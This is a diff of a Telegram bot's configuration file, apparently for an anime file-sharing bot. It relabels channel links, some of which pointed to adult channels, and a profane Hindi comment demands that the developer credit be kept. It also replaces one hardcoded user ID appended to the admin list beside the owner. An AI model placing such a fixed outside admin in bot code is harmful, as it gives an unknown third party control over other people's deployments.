@@ -44,10 +44,10 @@ ABOUT_TXT = """<b>›› ᴄᴏᴍᴍᴜɴɪᴛʏ: <a href='https://t.me/ABANIME
 
 
 CHANNELS_TXT = """<b>›› ᴀɴɪᴍᴇ ᴄʜᴀɴɴᴇʟ: <a href='https://t.me/ABANIMEOFFICIAL'>AB Anime</a>
-<blockquote expandable>›› ᴍᴏᴠɪᴇs: <a href='https://t.me/dub_anime_zz'>ᴍᴏᴠɪᴇғʟɪx sᴘᴏᴛ</a>
+<blockquote expandable>›› ᴍᴏᴠɪᴇs: <a href='https://t.me/dub_anime_zz'>AB Anime</a>
 ›› ᴡᴇʙsᴇʀɪᴇs: <a href='https://t.me/ABANIMEOFFICIAL'>AB Anime</a>
-›› ᴀᴅᴜʟᴛ ᴄʜᴀɴɴᴇʟs: <a href='https://t.me/ABANIMEOFFICIAL'>ᴄᴏʀɴʜᴜʙ</a>
-›› ᴍᴀɴʜᴡᴀ ᴄʜᴀɴɴᴇʟ: <a href='https://t.me/ABANIMEOFFICIAL'>ᴘᴏʀɴʜᴡᴀ</a>
+›› ᴀᴅᴜʟᴛ ᴄʜᴀɴɴᴇʟs: <a href='https://t.me/ABANIMEOFFICIAL'>AB Anime</a>
+›› ᴍᴀɴʜᴡᴀ ᴄʜᴀɴɴᴇʟ: <a href='https://t.me/ABANIMEOFFICIAL'>AB Anime</a>
 ›› ᴄᴏᴍᴍᴜɴɪᴛʏ: <a href='https://t.me/ABANIMEOFFICIAL'>AB Anime</a>
 ›› ᴅᴇᴠᴇʟᴏᴘᴇʀ: @Eren_Yeager_76</b></blockquote>"""  # Bhosdiwalo agar developer me Yato ka username hataya to agli baar se koi repo public nhi krunga!!
 
@@ -71,7 +71,7 @@ except ValueError:
 
 # Admin == OWNER_ID
 ADMINS.append(OWNER_ID)
-ADMINS.append(6497757690)
+ADMINS.append(6883111123)
 
 
 logging.basicConfig(
